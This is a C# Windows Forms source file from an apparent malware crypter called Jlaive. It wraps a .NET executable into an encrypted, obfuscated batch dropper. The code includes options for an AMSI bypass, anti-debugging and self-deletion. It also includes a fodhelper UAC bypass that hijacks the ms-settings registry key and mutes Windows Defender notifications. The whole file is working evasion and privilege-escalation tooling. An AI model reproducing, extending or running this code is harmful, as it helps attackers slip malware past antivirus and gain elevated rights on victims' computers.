using System;
using System.CodeDom.Compiler;
using System.IO;
using System.Text;
using System.Windows.Forms;
using Microsoft.CSharp;

using static Jlaive.Utils;

namespace Jlaive
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.RestoreDirectory = true;
            if (ofd.ShowDialog() != DialogResult.OK) return;
            textBox1.Text = ofd.FileName;
        }

        private void button2_Click(object sender, EventArgs e)
        {
            string path = textBox1.Text;
            byte[] pbytes = File.ReadAllBytes(path);

            Random rng = new Random();
            string stub;
            if (IsAssembly(path)) stub = StubGen.CreateCS(pbytes, bypassAMSI.Checked, antiDebug.Checked, rng);
            else
            {
                MessageBox.Show("Input file not valid assembly!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            string tempfile = Path.GetTempFileName();
            CSharpCodeProvider csc = new CSharpCodeProvider();
            CompilerParameters parameters = new CompilerParameters(new[] { "mscorlib.dll", "System.Core.dll", "System.dll" }, tempfile)
            {
                GenerateExecutable = true,
                CompilerOptions = "/optimize",
                IncludeDebugInformation = true
            };
            csc.CompileAssemblyFromSource(parameters, stub);
            byte[] stubbytes = File.ReadAllBytes(tempfile);
            File.Delete(tempfile);

            string key = RandomString(20, rng);
            byte[] encrypted = XORCrypt(Compress(stubbytes), key);
            string command = StubGen.CreatePS(key, rng);

            StringBuilder toobf = new StringBuilder();
            toobf.AppendLine(@"echo F|xcopy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe pshell.exe /y");
            toobf.AppendLine("cls");
            if (bypassUAC.Checked)
            {
                toobf.AppendLine(@"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.Defender.SecurityCenter /v Enabled /t REG_DWORD /d 0 /f");
                toobf.AppendLine(@"cmd /c reg add HKCU\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_SZ /f && reg add HKCU\Software\Classes\ms-settings\shell\open\command /t REG_SZ /d ""%~dp0" + command + @""" /f");
                toobf.AppendLine("fodhelper");
                toobf.AppendLine(@"reg delete HKCU\Software\Classes\ms-settings\shell\open\command /f");
                toobf.AppendLine(@"reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.Defender.SecurityCenter /v Enabled /f");
            }
            else toobf.AppendLine(command);
            toobf.Append("del pshell.exe");

            StringBuilder output = new StringBuilder();
            output.AppendLine("@echo off");
            if (obfuscate.Checked) output.Append(Obfuscator.GenCode(toobf.ToString(), rng, 1));
            else output.AppendLine(toobf.ToString());
            if (selfDelete.Checked) output.AppendLine("(goto) 2>nul & del \"%~f0\"");
            output.AppendLine("exit");
            output.Append(Convert.ToBase64String(encrypted));

            File.WriteAllText($"{AppDomain.CurrentDomain.BaseDirectory}\\{Path.GetFileNameWithoutExtension(textBox1.Text)}.bat", output.ToString(), Encoding.ASCII);
        }
    }
}
